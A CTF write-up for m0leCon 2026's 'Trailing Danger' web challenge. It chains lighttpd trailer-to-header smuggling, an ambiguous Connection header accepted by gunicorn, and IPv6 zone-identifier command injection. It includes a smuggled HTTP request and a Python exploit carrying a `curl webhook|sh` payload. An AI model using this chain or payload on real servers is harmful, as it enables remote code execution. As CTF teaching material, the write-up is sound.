# m0leCon CTF 2026 Teaser

# [web] Trailing Danger (16 solves)

The proxy I use is the best, I completely trust it. I doubt you will be able to bypass its protections.

Author: Sebastiano Sartor <@sebsrt>

## Overview

The goal of the challenge is to bypass the proxy rule `url.access-deny = ( "debug" )`
and achieve RCE on the `/debug` endpoint.
```python
@app.post("/debug")
@validate_ip
def ping(ip_address: str):
    try:
        os.popen(f'ping -c 1 {ip_address}')
        return jsonify({"status": "success"})    
    except subprocess.TimeoutExpired:
        return jsonify({"error": "Ping request timed out"}), 408
    except Exception as e:
        return jsonify({"error": str(e)}), 500
```

## Solution

### 1. Header smuggling due to trailers merge into headers

Lighttpd 1.4.80 is used as proxy. This version is vulnerable to **HTTP Header Smuggling due to trailer fields merge into headers**. This vulnerability allows to overwrite the request headers values after the parsing of the request headers and body. The fix for for it can be found here: [[core] security: fix to reject disallowed trailers](https://github.com/lighttpd/lighttpd1.4/commit/35cb89c103877de62d6b63d0804255475d77e5e1).

the fix commit states that:
> lighttpd mod_proxy sends Connection: close to backends, so this bug isnot exploitable to send additional requests to backends

To make the bug exploitable and turn it into a Request Smuggling, another parsing bug has to be exploited:

### 2. Connection header parsing bug

Many web servers only close a connection when they see the literal header `Connection: close`. 

However, [RFC 9110](https://www.rfc-editor.org/rfc/rfc9110#name-connection) allows the `Connection` header to carry multiple, comma-separated options, which must be parsed as independent tokens.
If the token `close` appears anywhere in that list, the connection **must not persist** (see [RFC 9112](https://www.rfc-editor.org/rfc/rfc9112.html#name-persistence)).

---

When lighttpd encounters these headers:
```
TE: trailers
Upgrade: any
Connection: any
```
it returns an 'ambiguous' connection header: `Connection: close, upgrade, te`.

*This also bypasses the configuration restrictions as it should be configured with `proxy.header += ( "upgrade" => "enable" )` to support upgrade*

The **ambiguous connection header sent by the proxy won't be interpreted as `close` by gunicorn, leaving the connection open and enabling request smuggling**.

### 3. Command injection via IPv6 zone identifiers

IPv6 **link-local** addresses (`fe80::/10`) can exist on multiple interfaces of the same host. To disambiguate which link you mean, IPv6 text form allows a **zone identifier** (aka *zone index* / *scope ID*) appended as `%<zone>`:

```
fe80::1%eth0
```

[RFC 6874](https://datatracker.ietf.org/doc/html/rfc6874) defines how zones appear in URIs and constrains the characters allowed in the zone text:

> A `<zone_id>` SHOULD contain only ASCII characters classified as “unreserved” for use in URIs [RFC3986]. This excludes characters such as “]” or even “%” that would complicate parsing.

this gives us enough characters to build a valid IPv6 address that can contain shell commands, for example:

 `::1%$(curl webhook|sh)`


### Connecting the dots - TR.MRG HTTP Request Smuggling

Send the following request to lighttpd:
```http
POST / HTTP/1.1
Host: localhost:3002
Transfer-Encoding: chunked

7c
POST /debug HTTP/1.1
Host: localhost
Content-Type: application/json
Content-Length: 50

{"ip":"::1%$(curl webhook|sh)"}
0
Content-Length: 0
TE: trailers
Connection: x
```

It will:
- dechunk the request
- merge the trailer fields into headers overriding the content-length with `0`
- add the `te` token to the connection options.

This is the request that  will be forwarded to the backend:
```http
POST / HTTP/1.1
Host: localhost:3002
Content-Length: 0
Connection: close, te

POST /debug HTTP/1.1
Host: localhost
Content-Type: application/json
Content-Length: 50

{"ip":"::1%$(curl webhook|sh)"}
```

## Exploit
```python
import socket

webhook = "url"

cmd = f'{{"ip":"::1%$(curl {webhook}|sh)"}}'

smug = f'POST /debug HTTP/1.1\r\nHost: localhost\r\nContent-Type: application/json\r\nContent-Length: {len(cmd)}\r\n\r\n{cmd}'
req = f'POST / HTTP/1.1\r\nHost: localhost:3002\r\nTransfer-Encoding: chunked\r\n\r\n{len(smug):x}\r\n{smug}\r\n0\r\nContent-Length: 0\r\nTE: trailers\r\nConnection: x\r\n\r\n'

print(req)

try:
    sock = socket.create_connection(("trailing-danger.challs.m0lecon.it", 32769), timeout=20)
    sock.sendall(req.encode())
except Exception as e:
    print('error', e)
finally:
    sock.close()
```
